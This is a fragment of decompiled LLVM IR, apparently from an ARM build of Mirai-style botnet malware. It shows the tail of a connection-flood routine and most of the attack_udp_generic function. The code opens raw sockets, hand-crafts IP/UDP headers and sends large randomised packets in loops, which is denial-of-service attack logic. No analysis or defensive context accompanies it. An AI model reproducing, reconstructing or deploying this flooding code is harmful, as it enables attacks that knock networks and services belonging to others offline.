  %v4_b758 = zext i8 %v3_b758 to i32
  store i32 %v4_b758, i32* %r3.global-to-local, align 4
  %tmp = icmp ult i8 %v3_b758, 32
  br i1 %tmp, label %dec_label_pc_b7e0, label %dec_label_pc_b764

dec_label_pc_b764:                                ; preds = %dec_label_pc_b73c, %dec_label_pc_b7e0
  %v0_b768 = phi i32 [ %v0_b758, %dec_label_pc_b73c ], [ %v0_b768.pre, %dec_label_pc_b7e0 ]
  %v1_b76c = load i32, i32* @r8, align 4
  %v2_b76c = add i32 %v1_b76c, %stack_var_-60.0
  %v3_b76c = inttoptr i32 %v2_b76c to i32*
  %v4_b76c = load i32, i32* %v3_b76c, align 4
  %v3_b774 = call i32 @__libc_connect(i32 %v4_b76c, i32 %v0_b768, i32 16)
  %v0_b77c = load i32, i32* @sb, align 4
  %v1_b77c = load i32, i32* @r7, align 4
  %v9_b77c = icmp eq i32 %v0_b77c, %v1_b77c
  %v1_b780 = add i32 %stack_var_-60.0, 4
  store i32 %v1_b780, i32* %r3.global-to-local, align 4
  br i1 %v9_b77c, label %dec_label_pc_b834, label %dec_label_pc_b78c

dec_label_pc_b78c:                                ; preds = %dec_label_pc_b764, %dec_label_pc_b6fc
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_b6fc ], [ %v1_b780, %dec_label_pc_b764 ]
  store i32 65535, i32* @r4, align 4
  %v2_b79c = call i32 @calloc(i32 65535, i32 1)
  store i32 %v5_b7ac, i32* %r3.global-to-local, align 4
  %v1_b7b8 = load i32, i32* @r4, align 4
  %v9_b7b8 = icmp eq i32 %v3_b65c, %v1_b7b8
  %v1_b7bc = load i32, i32* @fp, align 4
  %v2_b7bc = add i32 %v1_b7bc, %arg2
  store i32 %v2_b7bc, i32* @r6, align 4
  %v2_b7c0 = load i32, i32* @sl, align 4
  %v3_b7c0 = add i32 %v2_b7c0, %stack_var_-60.0
  %v4_b7c0 = inttoptr i32 %v3_b7c0 to i32*
  store i32 %v2_b79c, i32* %v4_b7c0, align 4
  br i1 %v9_b7b8, label %dec_label_pc_b7cc, label %bb51

bb51:                                             ; preds = %dec_label_pc_b78c
  %v1_b7c4 = load i32, i32* %r3.global-to-local, align 4
  %v2_b7c4 = trunc i32 %v1_b7c4 to i16
  %v3_b7c4 = load i32, i32* @r6, align 4
  %v4_b7c4 = add i32 %v3_b7c4, 2
  %v5_b7c4 = inttoptr i32 %v4_b7c4 to i16*
  store i16 %v2_b7c4, i16* %v5_b7c4, align 2
  br label %dec_label_pc_b70c

dec_label_pc_b7cc:                                ; preds = %dec_label_pc_b78c
  %v0_b7cc = call i32 @rand_next()
  %v1_b7cc = trunc i32 %v0_b7cc to i16
  %v0_b7d4 = load i32, i32* @fp, align 4
  %v2_b7d4 = add i32 %v0_b7d4, %arg2
  store i32 %v2_b7d4, i32* @r6, align 4
  %v4_b7d8 = add i32 %v2_b7d4, 2
  %v5_b7d8 = inttoptr i32 %v4_b7d8 to i16*
  store i16 %v1_b7cc, i16* %v5_b7d8, align 2
  br label %dec_label_pc_b70c

dec_label_pc_b7e0:                                ; preds = %dec_label_pc_b73c
  %v1_b7e0 = add i32 %v0_b758, 16
  %v2_b7e0 = inttoptr i32 %v1_b7e0 to i32*
  %v3_b7e0 = load i32, i32* %v2_b7e0, align 4
  store i32 %v3_b7e0, i32* @r4, align 4
  %v0_b7e4 = call i32 @rand_next()
  %v0_b7e8 = load i32, i32* @r4, align 4
  %v1_b7f4 = and i32 %v0_b7e8, 65280
  store i32 %v1_b7f4, i32* %r3.global-to-local, align 4
  %v0_b7fc = load i32, i32* @r6, align 4
  %v1_b7fc = add i32 %v0_b7fc, 20
  %v2_b7fc = inttoptr i32 %v1_b7fc to i8*
  %v3_b7fc = load i8, i8* %v2_b7fc, align 1
  %v4_b7fc = zext i8 %v3_b7fc to i32
  %v5_b800 = call i32 @llvm.bswap.i32(i32 %v0_b7e8)
  %v7_b804 = lshr i32 %v0_b7e4, %v4_b7fc
  %v8_b804 = add i32 %v7_b804, %v5_b800
  %v5_b81c = call i32 @llvm.bswap.i32(i32 %v8_b804)
  store i32 %v5_b81c, i32* %r3.global-to-local, align 4
  %v2_b820 = add i32 %v0_b7fc, 4
  %v3_b820 = inttoptr i32 %v2_b820 to i32*
  store i32 %v5_b81c, i32* %v3_b820, align 4
  %v0_b768.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_b764

dec_label_pc_b828:                                ; preds = %dec_label_pc_b70c
  store i32 %v18_b608, i32* %sb.global-to-local, align 4
  ret i32 %v3_b718

dec_label_pc_b834:                                ; preds = %dec_label_pc_b764, %dec_label_pc_b6f4
  %v1_b87422 = phi i32 [ 0, %dec_label_pc_b6f4 ], [ %v0_b77c, %dec_label_pc_b764 ]
  %v2_b838 = icmp eq i32 %v0_b6d810, 0
  br i1 %v2_b838, label %dec_label_pc_b858.outer, label %dec_label_pc_b870

dec_label_pc_b848:                                ; preds = %dec_label_pc_b858
  store i32 %v1_b84c, i32* @r4, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_b848 = load i32, i32* @r8, align 4
  %v4_b848 = mul i32 %v1_b84c, 4
  %v5_b848 = add i32 %v0_b848, %v4_b848
  %v6_b848 = inttoptr i32 %v5_b848 to i32*
  %v7_b848 = load i32, i32* %v6_b848, align 4
  %v0_b84c = load i32, i32* @sl, align 4
  %v5_b84c = add i32 %v0_b84c, %v4_b848
  %v6_b84c = inttoptr i32 %v5_b84c to i32*
  %v7_b84c = load i32, i32* %v6_b84c, align 4
  %v4_b850 = call i32 @__libc_send(i32 %v7_b848, i32 %v7_b84c, i32 %v0_b85c, i32 16384)
  %v0_b854 = load i32, i32* @r4, align 4
  %v1_b854 = add i32 %v0_b854, 1
  %v0_b858.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_b858.outer

dec_label_pc_b858.outer:                          ; preds = %dec_label_pc_b834, %dec_label_pc_b848
  %v0_b858.ph = phi i32 [ %v0_b858.pre.pre, %dec_label_pc_b848 ], [ %v1_b87422, %dec_label_pc_b834 ]
  %v1_b84c.ph = phi i32 [ %v1_b854, %dec_label_pc_b848 ], [ 0, %dec_label_pc_b834 ]
  %v0_b85c = load i32, i32* @r5, align 4
  br label %dec_label_pc_b858

dec_label_pc_b858:                                ; preds = %dec_label_pc_b858.outer, %dec_label_pc_b858
  %v1_b84c = phi i32 [ 0, %dec_label_pc_b858 ], [ %v1_b84c.ph, %dec_label_pc_b858.outer ]
  %v8_b864 = icmp sgt i32 %v0_b858.ph, %v1_b84c
  br i1 %v8_b864, label %dec_label_pc_b848, label %dec_label_pc_b858

dec_label_pc_b870:                                ; preds = %dec_label_pc_b874, %dec_label_pc_b834
  %v1_b87421 = phi i32 [ %v1_b87422, %dec_label_pc_b834 ], [ %v1_b874, %dec_label_pc_b874 ]
  br label %dec_label_pc_b874

dec_label_pc_b874:                                ; preds = %dec_label_pc_b880, %dec_label_pc_b870
  %v1_b874 = phi i32 [ %v1_b87421, %dec_label_pc_b870 ], [ %v1_b874.pre, %dec_label_pc_b880 ]
  %v1_b880 = phi i32 [ 0, %dec_label_pc_b870 ], [ %v1_b8a0, %dec_label_pc_b880 ]
  store i32 %v1_b880, i32* @r6, align 4
  %v6_b87c = icmp slt i32 %v1_b880, %v1_b874
  br i1 %v6_b87c, label %dec_label_pc_b880, label %dec_label_pc_b870

dec_label_pc_b880:                                ; preds = %dec_label_pc_b874
  %v0_b878 = load i32, i32* @r5, align 4
  %v0_b880 = load i32, i32* @sl, align 4
  %v4_b880 = mul i32 %v1_b880, 4
  %v5_b880 = add i32 %v0_b880, %v4_b880
  %v6_b880 = inttoptr i32 %v5_b880 to i32*
  %v7_b880 = load i32, i32* %v6_b880, align 4
  store i32 %v7_b880, i32* @r4, align 4
  %v2_b888 = inttoptr i32 %v7_b880 to i16*
  %v3_b888 = call i32 @rand_str(i16* %v2_b888, i32 %v0_b878)
  %v0_b88c = load i32, i32* @r8, align 4
  %v1_b88c = load i32, i32* @r6, align 4
  %v4_b88c = mul i32 %v1_b88c, 4
  %v5_b88c = add i32 %v4_b88c, %v0_b88c
  %v6_b88c = inttoptr i32 %v5_b88c to i32*
  %v7_b88c = load i32, i32* %v6_b88c, align 4
  %v0_b890 = load i32, i32* @r4, align 4
  %v0_b894 = load i32, i32* @r5, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_b89c = call i32 @__libc_send(i32 %v7_b88c, i32 %v0_b890, i32 %v0_b894, i32 16384)
  %v0_b8a0 = load i32, i32* @r6, align 4
  %v1_b8a0 = add i32 %v0_b8a0, 1
  %v1_b874.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_b874

; uselistorder directives
  uselistorder i32 %v1_b874, { 1, 0 }
  uselistorder i32 %v1_b84c, { 2, 1, 0 }
  uselistorder i32 %v5_b81c, { 1, 0 }
  uselistorder i32 %stack_var_-60.0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_b758, { 1, 0, 2 }
  uselistorder i32 %v3_b718, { 1, 3, 2, 0 }
  uselistorder i32 %v3_b6ac, { 1, 0 }
  uselistorder i32 %v3_b65c, { 2, 0, 1 }
  uselistorder i32* %stack_var_-56, { 1, 3, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 15, 2, 3, 7, 8, 4, 5, 6, 9, 10, 11, 12, 13, 14, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_b858, { 1, 0 }
  uselistorder label %dec_label_pc_b858.outer, { 1, 0 }
  uselistorder label %dec_label_pc_b764, { 1, 0 }
  uselistorder label %dec_label_pc_b70c, { 1, 0 }
  uselistorder label %dec_label_pc_b6f4, { 1, 0 }
}

define i32 @attack_udp_generic(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v18_b8a8 = load i32, i32* @sb, align 4
  %v27_b8a8 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_b8c4 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_b8c8 = load i32, i32* @r5, align 4
  store i32 %v0_b8c8, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b8d8 = load i32, i32* @r4, align 4
  store i32 %v0_b8d8, i32* %r0.global-to-local, align 4
  %v5_b8dc = inttoptr i32 %v0_b8c8 to i32*
  %v6_b8dc = call i32 @attack_get_opt_int(i32 %v0_b8d8, i32* %v5_b8dc, i32 2, i32 0, i32 %v2_b8c4)
  %v1_b8e8 = urem i32 %v6_b8dc, 256
  store i32 %v1_b8e8, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_b8f4 = load i32, i32* @r5, align 4
  store i32 %v0_b8f4, i32* %r1.global-to-local, align 4
  %v0_b8f8 = load i32, i32* @r4, align 4
  store i32 %v0_b8f8, i32* %r0.global-to-local, align 4
  %v5_b8fc = trunc i32 %v6_b8dc to i8
  %v6_b900 = inttoptr i32 %v0_b8f4 to i32*
  %v7_b900 = call i32 @attack_get_opt_int(i32 %v0_b8f8, i32* %v6_b900, i32 3, i32 65535, i32 %v6_b8dc)
  %v0_b904 = load i32, i32* @r5, align 4
  store i32 %v0_b904, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_b914 = load i32, i32* @r4, align 4
  store i32 %v0_b914, i32* %r0.global-to-local, align 4
  %v5_b918 = inttoptr i32 %v0_b904 to i32*
  %v6_b918 = call i32 @attack_get_opt_int(i32 %v0_b914, i32* %v5_b918, i32 4, i32 64, i32 %v7_b900)
  %v1_b920 = urem i32 %v6_b918, 256
  store i32 %v1_b920, i32* %ip.global-to-local, align 4
  %v0_b924 = load i32, i32* @r5, align 4
  store i32 %v0_b924, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b930 = load i32, i32* @r4, align 4
  store i32 %v0_b930, i32* %r0.global-to-local, align 4
  %v6_b938 = inttoptr i32 %v0_b924 to i32*
  %v7_b938 = call i32 @attack_get_opt_int(i32 %v0_b930, i32* %v6_b938, i32 5, i32 0, i32 %v1_b920)
  %v1_b944 = urem i32 %v7_b938, 256
  store i32 %v1_b944, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_b950 = load i32, i32* @r5, align 4
  store i32 %v0_b950, i32* %r1.global-to-local, align 4
  %v0_b954 = load i32, i32* @r4, align 4
  store i32 %v0_b954, i32* %r0.global-to-local, align 4
  %v5_b95c = inttoptr i32 %v0_b950 to i32*
  %v6_b95c = call i32 @attack_get_opt_int(i32 %v0_b954, i32* %v5_b95c, i32 6, i32 65535, i32 %v1_b944)
  %v0_b964 = load i32, i32* @r5, align 4
  store i32 %v0_b964, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_b95c, i32* %sb.global-to-local, align 4
  %v0_b974 = load i32, i32* @r4, align 4
  store i32 %v0_b974, i32* %r0.global-to-local, align 4
  %v5_b978 = inttoptr i32 %v0_b964 to i32*
  %v6_b978 = call i32 @attack_get_opt_int(i32 %v0_b974, i32* %v5_b978, i32 7, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_b97c = load i32, i32* @r5, align 4
  store i32 %v0_b97c, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v6_b978, i32* @sl, align 4
  %v0_b98c = load i32, i32* @r4, align 4
  store i32 %v0_b98c, i32* %r0.global-to-local, align 4
  %v5_b990 = inttoptr i32 %v0_b97c to i32*
  %v6_b990 = call i32 @attack_get_opt_int(i32 %v0_b98c, i32* %v5_b990, i32 0, i32 512, i32 ptrtoint (i32* @0 to i32))
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b99c = load i32, i32* @r5, align 4
  store i32 %v0_b99c, i32* %r1.global-to-local, align 4
  store i32 %v6_b990, i32* @r6, align 4
  %v0_b9a4 = load i32, i32* @r4, align 4
  store i32 %v0_b9a4, i32* %r0.global-to-local, align 4
  %v5_b9a8 = inttoptr i32 %v0_b99c to i32*
  %v6_b9a8 = call i32 @attack_get_opt_int(i32 %v0_b9a4, i32* %v5_b9a8, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v2_b9b4 = load i32, i32* @global_var_24a4c.59, align 4
  store i32 %v2_b9b4, i32* %r3.global-to-local, align 4
  %v1_b9b8 = urem i32 %v6_b9a8, 256
  store i32 %v1_b9b8, i32* %ip.global-to-local, align 4
  %v0_b9bc = load i32, i32* @r5, align 4
  store i32 %v0_b9bc, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_b9c4 = load i32, i32* @r4, align 4
  store i32 %v0_b9c4, i32* %r0.global-to-local, align 4
  %v5_b9cc = inttoptr i32 %v0_b9bc to i32*
  %v6_b9cc = call i32 @attack_get_opt_int(i32 %v0_b9c4, i32* %v5_b9cc, i32 25, i32 %v2_b9b4, i32 %v1_b9b8)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_b9e0 = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v3_b9e0, i32* %r0.global-to-local, align 4
  %v7_b9e4 = icmp eq i32 %v3_b9e0, -1
  store i1 %v7_b9e4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b9e0, i32* @fp, align 4
  br i1 %v7_b9e4, label %dec_label_pc_bd84, label %dec_label_pc_b9f0

dec_label_pc_b9f0:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_b9f8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_b9f8, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_ba0c = call i32 @__GI_setsockopt(i32 %v3_b9e0, i32 0, i32 3, i32 %v6_b9f8, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_ba0c, i32* %r0.global-to-local, align 4
  %v7_ba10 = icmp eq i32 %v5_ba0c, -1
  store i1 %v7_ba10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ba10, label %dec_label_pc_bd7c, label %dec_label_pc_ba18

dec_label_pc_ba18:                                ; preds = %dec_label_pc_b9f0
  %v0_ba18 = load i32, i32* @r6, align 4
  store i32 1460, i32* %r3.global-to-local, align 4
  %v3_ba24 = urem i32 %v0_ba18, 65536
  store i32 %v3_ba24, i32* %r2.global-to-local, align 4
  %v3_ba28 = icmp ugt i32 %v3_ba24, 1459
  %v9_ba28 = icmp eq i32 %v3_ba24, 1460
  store i1 %v9_ba28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_ba28, label %bb, label %bb48

bb:                                               ; preds = %dec_label_pc_ba18
  store i32 1460, i32* %r2.global-to-local, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_ba18, %bb
  %v0_ba84 = phi i32 [ %v3_ba24, %dec_label_pc_ba18 ], [ 1460, %bb ]
  store i32 %v7_b900, i32* %r0.global-to-local, align 4
  %v0_ba34 = load i32, i32* %sb.global-to-local, align 4
  %v3_ba3c = urem i32 %v0_ba34, 65536
  store i32 %v3_ba3c, i32* %ip.global-to-local, align 4
  %v0_ba40 = load i32, i32* @r7, align 4
  %v2_ba40 = icmp eq i32 %v0_ba40, 0
  store i1 %v2_ba40, i1* %cpsr_z.global-to-local, align 1
  %v0_ba44 = load i32, i32* @sl, align 4
  %v3_ba44 = mul i32 %v0_ba44, 65536
  br i1 %v2_ba40, label %bb49, label %bb50

bb49:                                             ; preds = %bb48
  store i32 %v0_ba84, i32* %ip.global-to-local, align 4
  br label %bb50

bb50:                                             ; preds = %bb48, %bb49
  %v1_ba74 = phi i32 [ %v3_ba3c, %bb48 ], [ %v0_ba84, %bb49 ]
  %v3_ba54 = urem i32 %v0_ba44, 65536
  store i32 %v3_ba54, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_ba5c = urem i32 %v7_b900, 65536
  store i32 %v3_ba5c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_ba40, label %.thread, label %dec_label_pc_ba7c

.thread:                                          ; preds = %bb50
  %v2_ba70 = add nsw i32 %v1_ba74, 28
  store i32 %v2_ba70, i32* @sb, align 4
  %v2_ba74 = add nsw i32 %v1_ba74, 8
  store i32 %v2_ba74, i32* @sl, align 4
  br label %dec_label_pc_bba0.preheader

dec_label_pc_ba7c:                                ; preds = %bb50
  %v1_ba84 = add nuw nsw i32 %v0_ba84, 28
  store i32 %v1_ba84, i32* @sb, align 4
  %v1_ba88 = add nuw nsw i32 %v0_ba84, 8
  store i32 %v1_ba88, i32* @sl, align 4
  %tmp51 = mul i32 %v0_ba34, 256
  %v3_ba9c = and i32 %tmp51, 65280
  %tmp52 = udiv i32 %v0_ba34, 256
  %v4_baac = urem i32 %tmp52, 256
  %v5_baac = or i32 %v4_baac, %v3_ba9c
  store i32 %v5_baac, i32* @r6, align 4
  store i32 %v3_ba44, i32* %r1.global-to-local, align 4
  %tmp53 = mul nuw nsw i32 %v1_ba84, 256
  %v3_bab8 = and i32 %tmp53, 65280
  store i32 %v3_bab8, i32* %r3.global-to-local, align 4
  %tmp54 = mul i32 %v0_ba44, 256
  %v3_babc = and i32 %tmp54, 65280
  %tmp55 = mul nuw nsw i32 %v1_ba88, 256
  %v3_bac0 = and i32 %tmp55, 65280
  store i32 %v3_bac0, i32* %ip.global-to-local, align 4
  %tmp56 = udiv i32 %v1_ba84, 256
  %v4_bac4 = urem i32 %tmp56, 256
  %v5_bac4 = or i32 %v4_bac4, %v3_bab8
  store i32 %v5_bac4, i32* @lr, align 4
  %tmp57 = udiv i32 %v0_ba44, 256
  %v4_bac8 = urem i32 %tmp57, 256
  %v5_bac8 = or i32 %v4_bac8, %v3_babc
  store i32 %v5_bac8, i32* %r0.global-to-local, align 4
  %trunc = trunc i32 %v1_ba88 to i16
  %rev = call i16 @llvm.bswap.i16(i16 %trunc)
  %tmp58 = mul i32 %v7_b900, 256
  %v3_bad0 = and i32 %tmp58, 65280
  store i32 %v3_bad0, i32* %r2.global-to-local, align 4
  %tmp59 = udiv i32 %v7_b900, 256
  %v4_bae0 = urem i32 %tmp59, 256
  %v5_bae0 = or i32 %v4_bae0, %v3_bad0
  store i32 %v5_bae0, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  %sext = mul nuw i32 %v5_bac4, 65536
  %v4_bb54 = sdiv i32 %sext, 65536
  %sext6 = mul nuw i32 %v5_bac8, 65536
  %v7_bb88 = sdiv i32 %sext6, 65536
  %v1_bb48 = trunc i32 %v6_b918 to i8
  %v3_bb88 = sext i16 %rev to i32
  br label %dec_label_pc_bae8

dec_label_pc_bae8:                                ; preds = %.thread8, %dec_label_pc_ba7c
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_baf4 = call i32 @calloc(i32 1510, i32 1)
  store i32 %v2_baf4, i32* %r0.global-to-local, align 4
  store i32 %v2_b8c4, i32* %r3.global-to-local, align 4
  %v3_bafc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bafc, i32* %r1.global-to-local, align 4
  %v2_bb00 = load i32, i32* @r4, align 4
  %v5_bb00 = mul i32 %v2_bb00, 4
  %v6_bb00 = add i32 %v5_bb00, %v2_b8c4
  %v7_bb00 = inttoptr i32 %v6_bb00 to i32*
  store i32 %v2_baf4, i32* %v7_bb00, align 4
  %v0_bb04 = load i32, i32* %r3.global-to-local, align 4
  %v1_bb04 = load i32, i32* %r1.global-to-local, align 4
  %v4_bb04 = mul i32 %v1_bb04, 4
  %v5_bb04 = add i32 %v4_bb04, %v0_bb04
  %v6_bb04 = inttoptr i32 %v5_bb04 to i32*
  %v7_bb04 = load i32, i32* %v6_bb04, align 4
  store i32 %v7_bb04, i32* %r0.global-to-local, align 4
  %v1_bb08 = inttoptr i32 %v7_bb04 to i8*
  %v2_bb08 = load i8, i8* %v1_bb08, align 1
  %tmp = urem i8 %v2_bb08, 16
  %v1_bb0c = zext i8 %tmp to i32
  %v1_bb10 = or i32 %v1_bb0c, 64
  store i32 %v1_bb10, i32* %r3.global-to-local, align 4
  %v1_bb14 = trunc i32 %v1_bb10 to i8
  store i8 %v1_bb14, i8* %v1_bb08, align 1
  %v0_bb18 = load i32, i32* %r0.global-to-local, align 4
  %v1_bb18 = inttoptr i32 %v0_bb18 to i8*
  %v2_bb18 = load i8, i8* %v1_bb18, align 1
  %v1_bb1c = and i8 %v2_bb18, -16
  %v1_bb20 = or i8 %v1_bb1c, 5
  store i32 %v1_b944, i32* %ip.global-to-local, align 4
  %v0_bb28 = load i32, i32* %r1.global-to-local, align 4
  %v3_bb28 = mul i32 %v0_bb28, 32
  store i32 %v3_bb28, i32* %r2.global-to-local, align 4
  store i8 %v1_bb20, i8* %v1_bb18, align 1
  %v0_bb30 = load i32, i32* %r1.global-to-local, align 4
  %v1_bb30 = add i32 %v0_bb30, 1
  store i32 %v1_bb30, i32* @r4, align 4
  %v0_bb34 = load i32, i32* %r2.global-to-local, align 4
  %tmp61 = mul i32 %v0_bb30, -8
  %v5_bb34 = add i32 %v0_bb34, %tmp61
  store i32 %v5_bb34, i32* %r2.global-to-local, align 4
  store i32 %v6_b8dc, i32* %r1.global-to-local, align 4
  %v2_bb3c = load i32, i32* %r0.global-to-local, align 4
  %v3_bb3c = add i32 %v2_bb3c, 1
  %v4_bb3c = inttoptr i32 %v3_bb3c to i8*
  store i8 %v5_b8fc, i8* %v4_bb3c, align 1
  store i32 %v1_b920, i32* %r3.global-to-local, align 4
  %v0_bb44 = load i32, i32* %ip.global-to-local, align 4
  %v2_bb44 = icmp eq i32 %v0_bb44, 0
  store i1 %v2_bb44, i1* %cpsr_z.global-to-local, align 1
  %v2_bb48 = load i32, i32* %r0.global-to-local, align 4
  %v3_bb48 = add i32 %v2_bb48, 8
  %v4_bb48 = inttoptr i32 %v3_bb48 to i8*
  store i8 %v1_bb48, i8* %v4_bb48, align 1
  %v0_bb4c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bb4c, label %.thread8, label %bb60

bb60:                                             ; preds = %dec_label_pc_bae8
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_bb50 = load i32, i32* %r0.global-to-local, align 4
  %v4_bb50 = add i32 %v3_bb50, 6
  %v5_bb50 = inttoptr i32 %v4_bb50 to i16*
  store i16 64, i16* %v5_bb50, align 2
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_bae8, %bb60
  store i32 %v4_bb54, i32* %ip.global-to-local, align 4
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_bb5c = load i32, i32* %r0.global-to-local, align 4
  %v3_bb5c = add i32 %v2_bb5c, 9
  %v4_bb5c = inttoptr i32 %v3_bb5c to i8*
  store i8 17, i8* %v4_bb5c, align 1
  %v0_bb60 = load i32, i32* %ip.global-to-local, align 4
  %v1_bb60 = trunc i32 %v0_bb60 to i16
  %v2_bb60 = load i32, i32* %r0.global-to-local, align 4
  %v3_bb60 = add i32 %v2_bb60, 2
  %v4_bb60 = inttoptr i32 %v3_bb60 to i16*
  store i16 %v1_bb60, i16* %v4_bb60, align 2
  store i32 %v6_b9cc, i32* %ip.global-to-local, align 4
  %v1_bb68 = load i32, i32* %r0.global-to-local, align 4
  %v2_bb68 = add i32 %v1_bb68, 12
  %v3_bb68 = inttoptr i32 %v2_bb68 to i32*
  store i32 %v6_b9cc, i32* %v3_bb68, align 4
  %v0_bb6c = load i32, i32* %r2.global-to-local, align 4
  %v1_bb6c = load i32, i32* @r8, align 4
  %v2_bb6c = add i32 %v1_bb6c, %v0_bb6c
  store i32 %v2_bb6c, i32* %r2.global-to-local, align 4
  %v1_bb70 = add i32 %v2_bb6c, 16
  %v2_bb70 = inttoptr i32 %v1_bb70 to i32*
  %v3_bb70 = load i32, i32* %v2_bb70, align 4
  store i32 %v3_bb70, i32* %r3.global-to-local, align 4
  %v0_bb74 = load i32, i32* @r5, align 4
  %v1_bb74 = trunc i32 %v0_bb74 to i16
  %v2_bb74 = load i32, i32* %r0.global-to-local, align 4
  %v3_bb74 = add i32 %v2_bb74, 4
  %v4_bb74 = inttoptr i32 %v3_bb74 to i16*
  store i16 %v1_bb74, i16* %v4_bb74, align 2
  %v0_bb78 = load i32, i32* %r0.global-to-local, align 4
  %v1_bb78 = add i32 %v0_bb78, 20
  store i32 %v1_bb78, i32* %r1.global-to-local, align 4
  %v0_bb7c = load i32, i32* %r3.global-to-local, align 4
  %v2_bb7c = add i32 %v0_bb78, 16
  %v3_bb7c = inttoptr i32 %v2_bb7c to i32*
  store i32 %v0_bb7c, i32* %v3_bb7c, align 4
  %v0_bb80 = load i32, i32* @r6, align 4
  %v1_bb80 = trunc i32 %v0_bb80 to i16
  %v2_bb80 = load i32, i32* %r0.global-to-local, align 4
  %v3_bb80 = add i32 %v2_bb80, 20
  %v4_bb80 = inttoptr i32 %v3_bb80 to i16*
  store i16 %v1_bb80, i16* %v4_bb80, align 2
  store i32 %v3_bb88, i32* %r0.global-to-local, align 4
  store i32 %v7_bb88, i32* %r3.global-to-local, align 4
  %v0_bb8c = load i32, i32* @r4, align 4
  %v1_bb8c = load i32, i32* @r7, align 4
  %v9_bb8c = icmp eq i32 %v0_bb8c, %v1_bb8c
  store i1 %v9_bb8c, i1* %cpsr_z.global-to-local, align 1
  %v2_bb90 = load i32, i32* %r1.global-to-local, align 4
  %v3_bb90 = add i32 %v2_bb90, 4
  %v4_bb90 = inttoptr i32 %v3_bb90 to i16*
  store i16 %rev, i16* %v4_bb90, align 2
  %v0_bb94 = load i32, i32* %r3.global-to-local, align 4
  %v1_bb94 = trunc i32 %v0_bb94 to i16
  %v2_bb94 = load i32, i32* %r1.global-to-local, align 4
  %v3_bb94 = add i32 %v2_bb94, 2
  %v4_bb94 = inttoptr i32 %v3_bb94 to i16*
  store i16 %v1_bb94, i16* %v4_bb94, align 2
  %v0_bb98 = load i32, i32* @r4, align 4
  store i32 %v0_bb98, i32* %stack_var_-44, align 4
  %v5_bb9c = icmp slt i32 %v0_bb8c, %v1_bb8c
  br i1 %v5_bb9c, label %dec_label_pc_bae8, label %dec_label_pc_bba0.preheader.loopexit

dec_label_pc_bba0.preheader.loopexit:             ; preds = %.thread8
  %v0_bba4.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_bba0.preheader

